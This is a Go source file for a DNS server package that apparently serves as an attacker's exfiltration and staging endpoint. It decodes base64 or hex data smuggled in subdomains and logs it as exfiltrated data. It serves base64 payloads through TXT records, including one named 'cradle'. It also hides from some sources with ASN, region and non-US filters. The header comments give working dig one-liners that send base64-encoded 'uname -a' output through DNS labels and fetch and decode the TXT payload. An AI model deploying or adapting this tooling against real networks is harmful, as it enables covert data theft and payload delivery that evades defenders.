package godns

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"regexp"
	"strings"
	"unicode"

	"github.com/DriftSec/getasn"
	"github.com/miekg/dns"
)

// tricks:
//		detects hex or base64 encoded data and logs the decoded data
//		base64 or hex can be anywhere in subs www.$(base64).test.com
//		split prefix can be used to split strings > 63 chars  split.$(string_part1).$(string_part2).test.com
//		TXT records can be used for pulling data,will be base64 encoded,  data > 255 chars will come back as multiple responses so you have to re-assemble.

// linux: split
// 		dig @127.0.0.1 -p 5354 split.$(uname -a|base64 -w0|sed 's/.\{63\}/&./g').test.com

// linux combine TXT
// 		dig +short @127.0.0.1 -p 5354 cradle.test.com TXT|sed 's/ //g;s/"//g'|base64 -d

type DNSConfig struct {
	Addr          string
	Port          string
	DefaultAnswer string
	Records       struct {
		TXT map[string]string
		A   map[string]string
		NS  map[string]string
		MX  map[string]string
	}
	Domain      string
	Cmds        map[string]func(string)
	JSONDoLog   bool
	JSONLogFile string
	Running     bool
	server      *dns.Server
	Blacklist   []string // slice of regex strings, compared to remote addr, question name
	OnlyUS      bool
}

func New() *DNSConfig {
	ret := &DNSConfig{}
	ret.Cmds = make(map[string]func(string))
	ret.Cmds["file"] = cmdFile
	ret.Records.A = make(map[string]string)
	ret.Records.TXT = make(map[string]string)
	ret.Records.NS = make(map[string]string)
	ret.Records.MX = make(map[string]string)
	return ret
}

func (dc *DNSConfig) ShutDown() {
	log.Println("Shutting down the DNS server...")
	dc.server.Shutdown()
	dc.Running = false
}

func (dc *DNSConfig) Run() {
	dc.Running = true
	dns.HandleFunc(".", dc.handler)
	dc.server = &dns.Server{Addr: dc.Addr + ":" + dc.Port, Net: "udp"}
	log.Printf("Starting DNS at %s\n", dc.server.Addr)
	err := dc.server.ListenAndServe()
	defer dc.server.Shutdown()
	if err != nil {
		log.Printf("Failed to start DNS server: %s\n ", err.Error())
	}
	dc.Running = false
}
func (dc *DNSConfig) Blacklisted(w dns.ResponseWriter, r *dns.Msg) (bool, *getasn.IPInfo) {
	ipinfo, err := getasn.GetASN(strings.Split(w.RemoteAddr().String(), ":")[0])
	if err != nil {
		log.Println("[ERROR] ipinfo.io:", err)
	}
	if dc.OnlyUS && ipinfo.Country != "" && ipinfo.Country != "US" {

		log.Println("DNS Blacklisted Non US:", ipinfo.Country)
		return true, ipinfo

	}

	if len(dc.Blacklist) == 0 {
		return false, ipinfo
	}

	for _, regx := range dc.Blacklist {
		if regx == "" {
			continue
		}
		rx, err := regexp.Compile(regx)
		if err != nil {
			log.Println("[ERROR] blacklist regex", regx+":", err)
		}
		if ipinfo.Org != "" {
			if rx.MatchString(ipinfo.Org) {
				log.Println("DNS Blacklisted ASN:", regx, ">>", ipinfo.Org)
				return true, ipinfo
			}
			if rx.MatchString(ipinfo.Region) {
				log.Println("DNS Blacklisted Region:", regx, ">>", ipinfo.Region)
				return true, ipinfo
			}
			if rx.MatchString(ipinfo.Country) {
				log.Println("DNS Blacklisted Country:", regx, ">>", ipinfo.Country)
				return true, ipinfo
			}
		}
		if rx.MatchString(w.RemoteAddr().String()) {
			log.Println("DNS Blacklisted RemoteAddr:", regx, ">>", w.RemoteAddr().String())
			return true, ipinfo
		}
		for _, q := range r.Question {
			if rx.MatchString(q.Name) {
				log.Println("DNS Blacklisted Question:", regx, ">>", q.Name)
				return true, ipinfo
			}

		}
	}
	return false, ipinfo
}

func (dc *DNSConfig) handler(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		dc.parseQuery(m, w, r)
	}
	w.WriteMsg(m)
}

func (dc *DNSConfig) parseQuery(m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	for _, question := range m.Question {
		switch question.Qtype {
		case dns.TypeA:
			dc.handleA(question, m, w, r)

		case dns.TypeTXT:
			dc.handleTXT(question, m, w, r)
		}
	}
}

func (dc *DNSConfig) handleA(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	blk, ipinf := dc.Blacklisted(w, r)
	if blk {
		rrStr := fmt.Sprintf("%s A %s", m.Question[0].Name, "")
		rr, err := dns.NewRR(rrStr)
		if err == nil {
			m.Answer = append(m.Answer, rr)
		}
		return
	}
	// set default generic response
	answer := dc.DefaultAnswer
	// handle custom specified with full domain
	if dc.Records.A[question.Name] != "" {
		answer = dc.Records.A[question.Name]
	}
	// handle custom specified as just a sub
	sub := dc.stripDomain(question.Name)
	if dc.Records.A[sub] != "" {
		answer = dc.Records.A[sub]
	}

	ex := dc.parseForExfil(question.Name)

	// return response
	rrStr := fmt.Sprintf("%s A %s", question.Name, answer)
	rr, err := dns.NewRR(rrStr)
	if err == nil {
		m.Answer = append(m.Answer, rr)
	}
	dc.LogQuery(question, m, w, r, answer, *ipinf)

	if len(ex) > 0 {
		log.Printf("DNS: A request for %s from %s (ASN: %s)\n     ├─ Response: %s\n", question.Name, w.RemoteAddr().String(), ipinf.Org, answer)
		fmt.Printf("     └─ Exfil data detected: %s\n", strings.Join(ex, ","))
	} else {
		log.Printf("A request for %s from %s (ASN: %s)\n     └─ Response: %s\n", question.Name, w.RemoteAddr().String(), ipinf.Org, answer)
	}
}

func (dc *DNSConfig) handleTXT(question dns.Question, m *dns.Msg, w dns.ResponseWriter, r *dns.Msg) {
	blk, ipinf := dc.Blacklisted(w, r)
	if blk {
		rrStr := fmt.Sprintf("%s TXT %s", m.Question[0].Name, "")
		rr, err := dns.NewRR(rrStr)
		if err == nil {
			m.Answer = append(m.Answer, rr)
		}
		return
	}
	var txt string
	txt = "NOT FOUND"

	// handle custom specified with full domain
	if dc.Records.TXT[question.Name] != "" {
		txt = dc.Records.TXT[question.Name]
	}
	// handle custom specified as just a sub
	sub := dc.stripDomain(question.Name)
	if dc.Records.TXT[sub] != "" {
		txt = dc.Records.TXT[sub]
	}

	rrStr := fmt.Sprintf("%s TXT %s", question.Name, base64.StdEncoding.EncodeToString([]byte(txt)))
	rr, err := dns.NewRR(rrStr)
	if err == nil {
		m.Answer = append(m.Answer, rr)
	}
	dc.LogQuery(question, m, w, r, sub, *ipinf)
	if txt != "NOT FOUND" {
		log.Printf("DNS: TXT request for %s from %s (ASN: %s):\n     └─ Sent: \"%s\" TXT record\n", question.Name, w.RemoteAddr().String(), ipinf.Org, sub)
	} else {
		log.Printf("DNS: TXT request for %s from %s (ASN: %s):\n", question.Name, w.RemoteAddr().String(), ipinf.Org)

	}
}

func (dc *DNSConfig) stripDomain(d string) string {
	return strings.TrimRight(strings.ReplaceAll(d, dc.Domain, ""), ".")
}

func getFirstSub(s string) string {
	return strings.Split(s, ".")[0]
}

func cmdFile(a string) {
	// TODO: handle file.filename.test.com
}

func (dc *DNSConfig) parseForExfil(q string) []string {
	var ret []string
	if getFirstSub(q) == "split" {
		clean := strings.ReplaceAll(strings.ReplaceAll(dc.stripDomain(q), "split.", ""), ".", "")
		ret = append(ret, strings.TrimRight(decodeHexOrBase64(clean), "\n"))
		return ret
	}
	data := ""
	tmp := strings.Split(q, ".")
	for _, p := range tmp {
		data = decodeHexOrBase64(p)
		if p != data && data != "" {
			ret = append(ret, strings.TrimRight(data, "\n"))
		}
	}
	return ret
}
func checkEncoding(q string) (bool, string) {
	return false, ""
}

func decodeHexOrBase64(content string) string {
	result := content
	dat := []byte(content)
	isHex := true
	for _, v := range dat {
		if v >= 48 && v <= 57 || v >= 65 && v <= 70 || v >= 97 && v <= 102 {
			// isHex = true
		} else {
			isHex = false
			break
		}
	}
	if isHex {
		if strings.HasPrefix(content, "0x") {
			strings.Replace(content, "0x", "", 1)
		}

		d, err := hex.DecodeString(content)
		if err == nil {
			result = string(d)
		}

	} else {
		r, _ := base64.StdEncoding.DecodeString(content)
		result = string(r)
	}

	if isASCII(result) {
		return result
	}
	return content

}

func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
